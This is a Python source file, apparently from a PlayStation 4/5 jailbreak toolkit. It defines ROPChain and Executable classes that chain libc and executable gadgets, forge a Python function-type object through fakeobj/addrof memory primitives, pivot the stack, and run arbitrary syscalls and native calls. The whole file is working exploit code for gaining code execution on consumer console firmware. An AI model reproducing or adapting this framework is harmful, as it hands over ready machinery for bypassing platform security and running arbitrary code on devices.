import struct
from types import FunctionType
from constants import (
    CONSOLE_KIND,
    SELECTED_LIBC,
    SELECTED_GADGETS,
)
from offsets import LIBC_GADGETS
from structure import StructureInstance
from utils.ref import get_ref_addr, refbytearray
from utils.etc import alloc, addrof, sizeof
from utils.unsafe import readbuf, fakeobj
from utils.pack import p64a


def convert_regs_to_int(*regs):
    int_regs = []
    for r in regs:
        if isinstance(r, (bytearray, str, unicode, StructureInstance)):
            int_regs.append(get_ref_addr(r))
        else:
            int_regs.append(r)
    return int_regs


class ROPChain(object):
    def __init__(self, sc, size=0x2000 if CONSOLE_KIND == "PS4" else 0xF000):
        self.sc = sc
        self.chain = bytearray(size)
        self.return_value_buf = alloc(8)
        self.return_value_addr = get_ref_addr(self.return_value_buf)
        self.errno_buf = alloc(4)
        self.errno_addr = get_ref_addr(self.errno_buf)
        self.index = 0

    @property
    def return_value(self):
        return struct.unpack("<Q", self.return_value_buf[0:8])[0]

    @property
    def errno(self):
        return struct.unpack("<I", self.errno_buf[0:4])[0]

    @property
    def addr(self):
        return get_ref_addr(self.chain)

    def reset(self):
        self.index = 0
        self.chain[:] = b"\0" * len(self.chain)

    def append(self, value):
        if self.index + 8 > len(self.chain):
            raise Exception("ROP chain overflow")
        self.chain[self.index : self.index + 8] = struct.pack("<Q", value)
        self.index += 8

    def extend(self, buf):
        if self.index + len(buf) > len(self.chain):
            raise Exception("ROP chain overflow")
        self.chain[self.index : self.index + len(buf)] = buf
        self.index += len(buf)

    def push_gadget(self, gadget_name):
        if gadget_name not in SELECTED_GADGETS:
            raise Exception("Gadget %s not found" % gadget_name)

        self.append(
            (
                self.sc.exec_addr
                if gadget_name not in LIBC_GADGETS
                else self.sc.libc_addr
            )
            + SELECTED_GADGETS[gadget_name]
        )

    def push_value(self, value):
        self.append(value)

    def push_syscall(self, syscall_number, rdi=0, rsi=0, rdx=0, rcx=0, r8=0, r9=0):
        (rdi, rsi, rdx, rcx, r8, r9) = convert_regs_to_int(rdi, rsi, rdx, rcx, r8, r9)

        self.push_gadget("pop rax; ret")
        self.push_value(syscall_number)
        self.push_gadget("pop rdi; ret")
        self.push_value(rdi)
        self.push_gadget("pop rsi; ret")
        self.push_value(rsi)
        self.push_gadget("pop rdx; ret")
        self.push_value(rdx)
        self.push_gadget("pop rcx; ret")
        self.push_value(rcx)
        self.push_gadget("pop r8; ret")
        self.push_value(r8)
        if CONSOLE_KIND == "PS4":
            self.push_gadget("pop r9; ret")
            self.push_value(r9)
        else:
            self.push_gadget("pop r9; ret 0xc25a")
            self.push_value(r9)
            self.extend(b"\0" * 0xC25A)  # align the stack
        if self.sc.platform == "ps5":
            self.push_value(self.sc.syscall_addr)
        else:
            self.push_value(self.sc.syscall_table[syscall_number])

    def push_call(self, addr, rdi=0, rsi=0, rdx=0, rcx=0, r8=0, r9=0):
        (rdi, rsi, rdx, rcx, r8, r9) = convert_regs_to_int(rdi, rsi, rdx, rcx, r8, r9)

        self.push_gadget("pop rdi; ret")
        self.push_value(rdi)
        self.push_gadget("pop rsi; ret")
        self.push_value(rsi)
        self.push_gadget("pop rdx; ret")
        self.push_value(rdx)
        self.push_gadget("pop rcx; ret")
        self.push_value(rcx)
        self.push_gadget("pop r8; ret")
        self.push_value(r8)
        if CONSOLE_KIND == "PS4":
            self.push_gadget("pop r9; ret")
            self.push_value(r9)
        else:
            self.push_gadget("pop r9; ret 0xc25a")
            self.push_value(r9)
            self.extend(b"\0" * 0xC25A)  # align the stack
        self.push_value(addr)

    def push_get_return_value(self):
        self.push_gadget("pop rsi; ret")
        self.push_value(self.return_value_addr)
        self.push_gadget("mov [rsi], rax; ret")

    def push_get_errno(self):
        self.push_call(self.sc.libc_addr + SELECTED_LIBC["__error"])
        self.push_gadget("pop rsi; ret")
        self.push_value(self.errno_addr)
        self.push_gadget("mov rax, [rax]; ret")
        self.push_gadget("mov [rsi], rax; ret")

    def push_write_into_memory(self, addr, value):
        self.push_gadget("pop rsi; ret")
        self.push_value(addr)
        self.push_gadget("pop rax; ret")
        self.push_value(value)
        self.push_gadget("mov [rsi], rax; ret")

    def push_store_rax_into_memory(self, addr):
        self.push_gadget("pop rsi; ret")
        self.push_value(addr)
        self.push_gadget("mov [rsi], rax; ret")

    def push_store_rdx_into_memory(self, addr):
        self.push_gadget("pop rcx; ret")
        self.push_value(addr)
        self.push_gadget("mov [rcx], rdx; ret")


class Executable(object):
    def __init__(self, sc, size=0x2000 if CONSOLE_KIND == "PS4" else 0xF000):
        self.sc = sc
        self.chain = ROPChain(sc, size)

        CONTEXT_SZ = 0x210

        # allocate the objects we need, so they can be used/reused by call()
        self.call_contextbuf = bytearray(CONTEXT_SZ)
        self.call_contextbuf[0x38:0x40] = p64a(self.chain.addr)
        self.call_contextbuf[0x130:0x138] = p64a(
            self.sc.libc_addr + SELECTED_GADGETS["mov rsp, [rdi + 0x38]; pop rdi; ret"]
        )

        # make a copy of the built-in function type object
        self.call_functype = readbuf(addrof(FunctionType), sizeof(FunctionType))

        self.call_functype[16 * 8 : 16 * 8 + 8] = p64a(
            self.sc.exec_addr
            + SELECTED_GADGETS[
                "push rbp; mov rbp, rsp; xor esi, esi; call [rdi + 0x130]"
            ]
        )

        # note: user must patch tp_call before use e.g.
        # call_functype[16*8:16*8 + 8] = p64a(0xdeadbeef)

        # get a pointer to our patched function type
        self.call_functype_ptr = refbytearray(self.call_functype)

        # note: user must set _call_contextbuf type object before each use.
        # (also need to set it here otherwise the gc will explode when it looks at my_func_ptr)
        self.call_contextbuf[8:16] = p64a(self.call_functype_ptr)

        self.my_func_ptr = refbytearray(self.call_contextbuf)
        # print("my_func_ptr", hex(my_func_ptr))
        self.call_func = fakeobj(self.my_func_ptr)

    @property
    def errno(self):
        return self.chain.errno

    def setup_front_chain(self):
        self.chain.push_value(0)

        # add bunch of padding to align the stack
        for _ in range(16):
            self.chain.push_gadget("add rsp, 0x1b8; ret")
            for _ in range(55):
                self.chain.push_value(0)

    def setup_call_chain(self, func_addr, rdi=0, rsi=0, rdx=0, rcx=0, r8=0, r9=0):
        self.chain.push_call(
            func_addr, rdi=rdi, rsi=rsi, rdx=rdx, rcx=rcx, r8=r8, r9=r9
        )

        # padding to align the stack
        self.chain.push_gadget("add rsp, 0x1b8; ret")
        for _ in range(55):
            self.chain.push_value(0)

    def setup_syscall_chain(
        self, syscall_number, rdi=0, rsi=0, rdx=0, rcx=0, r8=0, r9=0
    ):
        self.chain.push_syscall(
            syscall_number, rdi=rdi, rsi=rsi, rdx=rdx, rcx=rcx, r8=r8, r9=r9
        )

        # padding to align the stack
        self.chain.push_gadget("add rsp, 0x1b8; ret")
        for _ in range(55):
            self.chain.push_value(0)

    def setup_post_chain(self):
        self.chain.push_get_return_value()
        self.chain.push_get_errno()

    def setup_back_chain(self):
        self.chain.push_gadget("pop r8; ret")
        self.chain.push_value(addrof(None) + 0x7D)
        self.chain.push_gadget("pop rcx; ret")
        self.chain.push_value(1)
        self.chain.push_gadget("add [r8 - 0x7d], rcx; ret")
        self.chain.push_gadget("pop rax; ret")
        self.chain.push_value(addrof(None))
        self.chain.push_gadget("mov rsp, rbp; pop rbp; ret")

    def execute(self):
        self.call_func()
        return self.chain.return_value

    def __call__(self, rdi=0, rsi=0, rdx=0, rcx=0, r8=0, r9=0):
        pass
